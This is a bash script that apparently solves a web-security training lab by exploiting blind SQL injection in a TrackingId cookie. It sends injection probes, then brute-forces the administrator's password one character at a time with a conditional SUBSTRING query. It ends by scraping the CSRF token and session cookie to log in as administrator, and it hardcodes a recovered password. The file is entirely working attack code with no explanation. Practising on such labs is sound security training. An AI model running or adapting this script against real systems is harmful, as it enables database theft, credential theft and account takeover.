#!/bin/bash

source ../common.hook

function check_status() {
    curl $PS_URL -H "Cookie: TrackingId=${PAYLOAD}" | grep "Welcome back!"
    if [ $(echo $?) -ne 0 ]; then output 'False' ERROR; $(exit 1); else output 'True' SUCCESS; $(exit 0); fi
}

PAYLOAD=$(url_encode "' OR '1'='1")
check_status

PAYLOAD=$(url_encode "' UNION SELECT NULL-- ")
check_status

PAYLOAD=$(url_encode "' UNION SELECT 'a'-- ")
check_status

CHARLIST='abcdefghijklmnopqrstuvwxyz0123456789'
USERNAME='administrator'
PASSWORD='azc2qpip049s4w3z815a'
function brute_conditional() {
    for (( i=0; i<${#CHARLIST}; i++ )); do
        PASSWORD=${1}
        TRY="${PASSWORD}${CHARLIST:$i:1}"
        PAYLOAD=$(url_encode "' UNION SELECT NULL from users WHERE (SELECT SUBSTRING(password,1,${#TRY}) FROM users WHERE username='${USERNAME}' LIMIT 1)='${TRY}'-- ")
        output "$PAYLOAD" INFO
        curl $PS_URL -H "Cookie: TrackingId=${PAYLOAD}" | grep "Welcome back!"
        if [ $(echo $?) -eq 0 ]; then
            output "Current password: ${TRY}" SUCCESS
            brute_conditional $TRY
            return 0
        fi
    done
    return 0
}
brute_conditional $PASSWORD
output "Password found: $PASSWORD" SUCCESS

REQUEST=$(curl -c - "${PS_URL}/login")
CSRF=$(echo ${REQUEST} | sed -n "s/.*value=\"\(\S*\)\">.*/\1/p")
COOKIE=$(echo ${REQUEST} | sed -n "s/.*session\s\(\S*\)$/\1/p")

output "Trying POST on ${PS_URL}/login with -H (${COOKIE}) -d (${CSRF}|${USERNAME}|${PASSWORD})" INFO
curl "${PS_URL}/login" -H "Cookie: session=${COOKIE}" -d "csrf=${CSRF}&username=${USERNAME}&password=${PASSWORD}" -X POST

eval_result $PS_URL
